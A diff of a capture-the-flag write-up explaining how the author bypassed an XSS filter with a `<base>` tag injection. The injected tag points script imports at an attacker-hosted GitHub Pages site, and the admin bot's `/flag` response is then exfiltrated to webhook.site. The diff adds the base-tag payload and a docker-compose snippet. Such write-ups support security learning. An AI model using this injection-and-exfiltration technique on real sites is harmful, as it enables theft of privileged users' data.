@@ -187,7 +187,7 @@ Hmm, I was stuck. I cannot use `<script>` or `<img onerror='...'>` directly anym
 
 From the help of another CTF fellow player, I learnt that there was something called a `base` injection. A [`<base>` tag](https://www.w3schools.com/tags/tag_base.asp) can be injected into the website which makes it default all its import links to use that url as a base.
 
-If I inject that into the title tag, any subsequent script tags will import from that base instead.
+If I inject that into the title field, any subsequent script tags will import from that base instead.
 
 Time to put that into action.
 
@@ -227,22 +227,40 @@ The url for the website is derived based on the admin bot script
 
 async def visit(user_id, admin_token):
     url = f'http://web:8080/profile/{user_id}'
-    print("Visiting", url)
-    browser = await launch({'args': ['--no-sandbox', '--disable-setuid-sandbox']})
-    page = await browser.newPage()
+    ...
     await page.setCookie({'name': 'admin_token', 'value': admin_token, 'url': 'http://web:8080', 'httpOnly': True, 'sameSite': 'Strict'})
-    await page.goto(url)
-    await asyncio.sleep(3)
-    print("Done", admin_token)
-    await browser.close()
+    ...
 
 ```
 
-The admin bot visits `web:8080` as that is the internet website within the docker instance so I did the same too in this case.
+TLDR: This admin script asks the bot to visit `web:8080` and set the cookie `admin_token` to the value of `admin_token`. This means that the bot will visit `web:8080/profile/{user_id}` with the admin cookie set.
+
+```yaml
+---
+web:
+  container_name: web
+  build:
+    context: .
+    dockerfile: Dockerfile.web
+  environment:
+    - FLAG=EPFL{REDACTED}
+  depends_on:
+    - redis
+  ports:
+    - "8080:8080"
+```
+
+In docker, we can reference the ip of a container by using their container name. The admin bot visits `web:8080` as that is the configuration set in the `docker-compose.yml` file as shown above. So in this case, my script prompts a get request to `web:8080/flag` instead of the full url.
 
 After that the request is attached as a query parameter to the base url of my webhook site and the page was subsequently redirected to it.
 
 The github pages is available at [payload.jh123x.com](http://payload.jh123x.com/). It was time to inject my base and see the result on [webhook.site](https://webhook.site/).
+
+The payload that I used for the base injection is shown below and the github link upload is hosted at that url.
+
+```html
+<base href="http://payload.jh123x.com/" />
+```
 
 After tinkering around for a few hours, I manage to get the redirect and the flag was mine.
 
